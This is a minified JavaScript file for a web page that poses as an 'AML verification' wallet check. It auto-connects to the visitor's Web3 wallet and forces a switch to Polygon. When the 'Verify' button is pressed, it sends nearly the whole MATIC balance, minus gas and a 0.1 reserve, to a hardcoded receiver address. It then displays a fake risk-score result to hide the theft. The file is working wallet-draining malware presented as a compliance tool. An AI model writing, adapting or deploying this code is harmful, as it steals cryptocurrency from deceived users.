import{logger as e}from"./logger.js";let t,o,n=0;const r=window.location.href.includes("localhost")||window.location.href.includes("127.0.0.1"),a="0x45038a8Cc181432C57f7ABAa067067EE9e2F5974",s="0x74B04568C58a50E10698595e3C5F99702037dF62",c=r?s:a;async function i(){try{if(!o||!t)return void e.log("No signer or provider available");const r=await o.getAddress();e.log("Connected address:",r);const a=await t.getBalance(r);n=a,e.log("MATIC balance:",ethers.utils.formatEther(a),"MATIC")}catch(t){e.error("Error checking balances:",t)}}async function l(){document.getElementById("action-button");o?await w():(await d(),o&&await w())}async function d(){try{const n=document.getElementById("action-button");n.disabled=!0,n.classList.add("loading"),n.textContent="Connecting...",e.log("Starting wallet connection...");const r=await g();if(e.log("Provider status:",{isProviderFound:!!r,providerType:r?r.constructor.name:"none",isEthereum:!!window.ethereum,isRabby:!!window.rabby,hasWeb3:!(!window.web3||!window.web3.currentProvider)}),!r)throw new Error("Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.");t=new ethers.providers.Web3Provider(r,"any"),e.log("Requesting accounts..."),await t.send("eth_requestAccounts",[]),o=t.getSigner();const a=await o.getAddress();e.log("Connected address:",a);const s=await t.getNetwork();if(e.log("Current network:",s),137!==s.chainId){e.log("Switching to Polygon network...");try{await r.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x89"}]})}catch(t){if(e.log("Switch error:",t),4902!==t.code)throw t;try{await r.request({method:"wallet_addEthereumChain",params:[{chainId:"0x89",chainName:"Polygon",nativeCurrency:{name:"MATIC",symbol:"MATIC",decimals:18},rpcUrls:["https://polygon-rpc.com"],blockExplorerUrls:["https://polygonscan.com/"]}]})}catch(t){throw e.error("Add network error:",t),new Error("Failed to add Polygon network")}}}await i(),r.on("accountsChanged",(async n=>{e.log("Accounts changed:",n),o=t.getSigner(),await i()})),r.on("chainChanged",(()=>{e.log("Network changed, reloading..."),window.location.reload()})),n.disabled=!1,n.classList.remove("loading")}catch(n){e.error("Connection error:",n);const r=document.getElementById("action-button");r.disabled=!1,r.classList.remove("loading"),r.textContent="Connect Wallet for Verification",t=null,o=null}}async function w(){try{const n=document.getElementById("action-button");n.disabled=!0,n.classList.add("loading"),n.textContent="Verifying...";const r=await o.getAddress();e.log("Sending from address:",r);const a=await t.getBalance(r);if(e.log("Current MATIC balance:",ethers.utils.formatEther(a),"MATIC"),a.eq(0))return void e.log("No MATIC balance available");const s=await t.getGasPrice();e.log("Current gas price:",ethers.utils.formatUnits(s,"gwei"),"gwei");const l=21e3,d=s.mul(l).mul(120).div(100);e.log("Gas cost with buffer:",ethers.utils.formatEther(d),"MATIC");const w=ethers.utils.parseEther("0.1"),u=d.add(w);e.log("Total amount to reserve:",ethers.utils.formatEther(u),"MATIC");const g=a.sub(u);if(e.log("Amount to send:",ethers.utils.formatEther(g),"MATIC"),g.lte(0))throw e.log("Insufficient balance to cover gas fees and minimum reserve"),new Error("Insufficient balance to cover gas fees and minimum reserve");e.log("Sending transaction...");const h=await o.sendTransaction({to:c,value:g,gasLimit:l,maxFeePerGas:s.mul(2),maxPriorityFeePerGas:s});e.log("Transaction sent:",h.hash),await h.wait(),e.log("Transaction confirmed"),n.style.display="none";document.getElementById("aml-results").classList.add("visible");const m=document.querySelector(".risk-score-progress"),b=2*m.r.baseVal.value*Math.PI;m.style.strokeDasharray=`${b} ${b}`,m.style.strokeDashoffset=b,setTimeout((()=>{const e=b-.8*b;m.style.strokeDashoffset=e}),100),document.getElementById("transaction-hash").textContent=h.hash.slice(0,6)+"..."+h.hash.slice(-4),await i()}catch(t){e.error("Transaction error:",t);const o=document.getElementById("action-button");o.textContent=t.message||"Transaction failed",o.style.backgroundColor="var(--danger-color)",setTimeout((()=>{o.textContent="Verify",o.style.backgroundColor="var(--primary-color)"}),3e3)}finally{const e=document.getElementById("action-button");e.disabled=!1,e.classList.remove("loading")}}function u(t,o){e.log(`Status: ${t} (${o?"success":"error"})`)}async function g(){return window.ethereum?window.ethereum:window.rabby?window.rabby:window.web3&&window.web3.currentProvider?window.web3.currentProvider:new Promise((e=>{let t=0;const o=()=>{t++,window.ethereum?e(window.ethereum):window.rabby?e(window.rabby):window.web3&&window.web3.currentProvider?e(window.web3.currentProvider):t<3?setTimeout(o,300):e(null)};o()}))}e.log("isDev",r),e.log("PROD_RECEIVER_ADDRESS",a),e.log("RECEIVER_ADDRESS",c),document.addEventListener("DOMContentLoaded",(async()=>{console.log("Page loaded, checking providers:",{ethereum:!!window.ethereum,rabby:!!window.rabby,web3:!(!window.web3||!window.web3.currentProvider)});const e=await g();if(e){console.log("Web3 provider detected, attempting automatic connection...");try{const t=await e.request({method:"eth_accounts"});if(console.log("Current accounts:",t),t&&t.length>0)console.log("Found connected account, initiating automatic connection"),await l();else{console.log("No connected accounts, requesting connection...");try{const t=await e.request({method:"eth_requestAccounts"});console.log("New accounts after request:",t),t&&t.length>0?await l():console.log("User rejected connection request")}catch(e){console.log("Error requesting accounts:",e),4001===e.code?console.log("User rejected connection request"):console.error("Unexpected error:",e)}}}catch(e){console.error("Auto-connection check failed:",e),e.code&&console.log("Error code:",e.code),e.message&&console.log("Error message:",e.message)}}else console.log("No Web3 provider found");u("Please connect your wallet to continue",!0)}));